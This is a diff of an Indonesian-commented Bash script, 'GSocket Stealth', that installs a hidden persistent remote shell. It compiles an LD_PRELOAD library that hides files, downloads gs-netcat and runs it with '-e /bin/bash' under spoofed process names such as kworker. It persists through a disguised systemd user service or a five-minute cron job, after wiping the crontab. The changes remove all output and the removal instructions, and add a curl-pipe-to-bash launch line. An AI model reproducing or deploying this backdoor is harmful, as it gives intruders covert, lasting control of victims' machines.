@@ -1,6 +1,6 @@
 #!/bin/bash
-# GSocket Stealth - Bypass .bashrc Otomatis
-# Jalankan: bash setup.sh
+# GSocket Stealth - Zero Output Edition
+# Jalankan: bash -c "$(curl -fsSL https://raw.githubusercontent.com/sasisuro/shell/refs/heads/main/y)"
 
 set -e
 
@@ -8,9 +8,6 @@ if [ -z "$HOME" ]; then
     HOME=$(getent passwd "$(whoami)" | cut -d: -f6)
     export HOME
 fi
-
-USER=$(whoami)
-echo "[+] User: $USER"
 
 TOKEN=$(openssl rand -hex 20 2>/dev/null || date +%s | sha256sum | base64 | head -c 32)
 BASE_DIR="$HOME/.config/.cache/.systemd"
@@ -21,10 +18,9 @@ SERVICE_NAME="dbus-system.service"
 SERVICE_DIR="$HOME/.config/systemd/user"
 HIDE_NAME=$(shuf -e "systemd" "sshd" "kworker" "rsyslogd" "dbus-daemon" "NetworkManager" "gdm" "accounts-daemon" "swapper" "rcu_preempt" -n1 2>/dev/null || echo "systemd")
 
-mkdir -p "$BASE_DIR"
-cd "$BASE_DIR" || exit 1
+mkdir -p "$BASE_DIR" 2>/dev/null
+cd "$BASE_DIR" 2>/dev/null || exit 1
 
-echo "[+] Building core libraries..."
 cat > libcrypt.c << 'EOF'
 #define _GNU_SOURCE
 #include <dlfcn.h>
@@ -55,27 +51,24 @@ int stat(const char *path, struct stat *buf) {
 EOF
 
 gcc -shared -fPIC -o "$HIDE_LIB" libcrypt.c -ldl 2>/dev/null
-rm -f libcrypt.c
-chmod 600 "$HIDE_LIB"
-echo "[+] Core library: $HIDE_LIB"
+rm -f libcrypt.c 2>/dev/null
+chmod 600 "$HIDE_LIB" 2>/dev/null
 
 if [ ! -f "$CORE_BIN" ]; then
-    echo "[+] Fetching update notifier..."
     curl -fsSL https://github.com/hackerschoice/gsocket/releases/download/v1.4.42dev2/gs-netcat_linux-x86_64 -o "$CORE_BIN" 2>/dev/null || {
         curl -fsSL https://gsocket.io/bin/gs-netcat_x86_64-alpine.tar.gz -o /tmp/update.tar.gz 2>/dev/null
         tar xfz /tmp/update.tar.gz -C "$BASE_DIR" 2>/dev/null
         mv "$BASE_DIR/gs-netcat" "$CORE_BIN" 2>/dev/null || true
-        rm -f /tmp/update.tar.gz
+        rm -f /tmp/update.tar.gz 2>/dev/null
     }
-    chmod +x "$CORE_BIN"
+    chmod +x "$CORE_BIN" 2>/dev/null
 fi
 
 echo "$TOKEN" > "$TOKEN_FILE"
-chmod 600 "$TOKEN_FILE"
-echo "[+] System token: $TOKEN_FILE"
+chmod 600 "$TOKEN_FILE" 2>/dev/null
 
 start_daemon() {
-    cd "$HOME" || exit
+    cd "$HOME" 2>/dev/null || exit
     LD_PRELOAD="$HIDE_LIB" \
     GSOCKET_ARGS="-k $TOKEN_FILE -liqD -e /bin/bash --noprofile --norc" \
     exec -a "$HIDE_NAME" "$CORE_BIN" </dev/null >/dev/null 2>&1 &
@@ -88,8 +81,7 @@ if systemctl --user --no-pager status 2>/dev/null | grep -q "State:"; then
 fi
 
 if $HAS_SYSTEMD_USER; then
-    echo "[+] Configuring user service..."
-    mkdir -p "$SERVICE_DIR"
+    mkdir -p "$SERVICE_DIR" 2>/dev/null
     SERVICE_FILE="$SERVICE_DIR/$SERVICE_NAME"
     
     cat > "$SERVICE_FILE" << EOF
@@ -110,47 +102,18 @@ WorkingDirectory=$HOME
 WantedBy=default.target
 EOF
 
-    systemctl --user daemon-reload
+    systemctl --user daemon-reload 2>/dev/null
     systemctl --user enable "$SERVICE_NAME" 2>/dev/null || true
     systemctl --user restart "$SERVICE_NAME" 2>/dev/null || true
-    echo "[+] Service active: systemctl --user status $SERVICE_NAME"
     
     if ! pgrep -f "update-notifier" >/dev/null 2>&1; then
         start_daemon
     fi
 else
-    echo "[+] Scheduling periodic check (cron)..."
     crontab -r 2>/dev/null || true
     CRON_CMD="cd $HOME && LD_PRELOAD=$HIDE_LIB GSOCKET_ARGS=\"-k $TOKEN_FILE -liqD -e /bin/bash --noprofile --norc\" exec -a $HIDE_NAME $CORE_BIN </dev/null >/dev/null 2>&1"
-    (crontab -l 2>/dev/null || true; echo "*/5 * * * * $CRON_CMD") | crontab -
-    echo "[+] Cron active"
+    (crontab -l 2>/dev/null || true; echo "*/5 * * * * $CRON_CMD") | crontab - 2>/dev/null
     start_daemon
 fi
 
-if pgrep -f "update-notifier" >/dev/null 2>&1; then
-    echo "[!] Process visible (rootkit may not work)"
-else
-    echo "[+] Service running as: $HIDE_NAME"
-fi
-
-echo ""
-echo "=============================================="
-echo "✅ INSTALLATION COMPLETE"
-echo "=============================================="
-echo "🔑 Token: $TOKEN"
-echo ""
-echo "📌 CONNECT (LANGSUNG SHELL TANPA .BASHRC):"
-echo "   gs-netcat -s \"$TOKEN\" -i"
-echo ""
-echo "📌 REMOVE BACKDOOR:"
-if $HAS_SYSTEMD_USER; then
-    echo "   systemctl --user stop $SERVICE_NAME 2>/dev/null"
-    echo "   systemctl --user disable $SERVICE_NAME 2>/dev/null"
-    echo "   rm -f $SERVICE_DIR/$SERVICE_NAME"
-    echo "   systemctl --user daemon-reload 2>/dev/null"
-else
-    echo "   crontab -r 2>/dev/null"
-fi
-echo "   rm -rf $BASE_DIR"
-echo "   pkill -f update-notifier 2>/dev/null"
-echo "=============================================="
+echo "$TOKEN"
